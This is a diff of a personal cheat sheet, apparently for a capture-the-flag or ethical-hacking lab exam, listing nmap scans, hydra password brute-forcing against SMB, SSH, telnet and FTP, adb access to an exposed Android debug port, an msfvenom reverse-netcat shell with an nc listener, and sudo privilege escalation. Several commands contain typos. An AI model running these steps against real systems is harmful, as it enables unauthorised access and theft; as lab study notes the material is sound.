@@ -5,12 +5,76 @@ nmap -sn IP/24
 
 NMAP
 
+##01 Domain
 nmap -p389 -sV IP/24
-namp -sV -A -p 80 IP/24
-sudo nmap -T4 -Ss -p 139,445 - -script vuln IP/24
 sudo nmap -p 389,445 --open -oG - [host]/CIDR | grep open
 FQDN
 nmap -sC -sV [host]
 Look for DNS Computer Name
 Find FQDN
 nmap -p389 –sV -iL [host] or nmap -p389 –sV [host] (Find the FQDN in a subnet/network)
+
+##02 WampServer
+namp -sV -A -p 80 IP/24
+
+##03 SMB
+sudo nmap -T4 -Ss -p 139,445 - -script vuln 192.168.178.0/24
+hydra-l username -P /home/passlist.txt 192.168.178.1 smb
+smbclient //192.168.178.1/share
+smbclient -L 192.168.178.1
+Password from Hash and ls
+get sniff.txt ~/Desktop/flag.txt
+cat flag.txt
+use bctextencoder.exe to decode
+
+##04 Mobile Device
+sudo namp -p 5555 192.168.178.0/24
+adb connect 192.168.178.15:5555
+adb shell
+ls and cd to files
+adb pull /sdcard/scan or adb /sdcard/scan attacker/home/
+ls abd cd scan
+ent *.elf Dateien 
+sha384 *.elf Datei 
+
+##005 Vuln Scan
+nmap -Pn --script vuln IP
+Search for CVE and the Score
+
+##006 Command Line Execution
+Use Hydra break PAssword, login, acess and found flag
+RCE for Web Server Task-7
+nmap -p 22,23,80,3389 192.168.178.0/24
+sudo nmap -sS -sV -p- -O ipadd
+telnet 192.168.178.80 and get GET / HTTP/1.0
+hydra -L user.txt -P pass.txt 192.168.178.1 ssh
+hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.178.106 telnet
+ssh ubuntu@192.168.178.1
+telnet 192.168.178.1
+msfvenom -p cmd/unix/reverse_netcat LHOST=IP LPORT=444 und der Prad zur Zielmaschine
+after Login paste find. -name flag.txt
+start lsiten nc -lnvp 444
+type password
+ls
+find . -name NetworkPass.txt
+cat /path/NetworkPass.txt
+
+#007 Stego
+openstego or https://georgeom.net/StegOnline/upload
+
+#008 FTP
+nmap -p 21 192.168.178.0/24
+sudo nmap -sS -A -T4 IP/24
+hydra -L user.txt -P pass.txt ftp://192.168.178.1
+ftp 192.168.178.1 and type user and password
+ls dinf . -name credential.txt
+
+#009 Priv Escalation
+nmap -sV -p 22 192.168.178.0/24
+ssh smith@192.168.178.1 und das angegebene Password
+sudo -i
+cd /
+find .-name imroot.txt
+cat path/imroot.txt
+
+
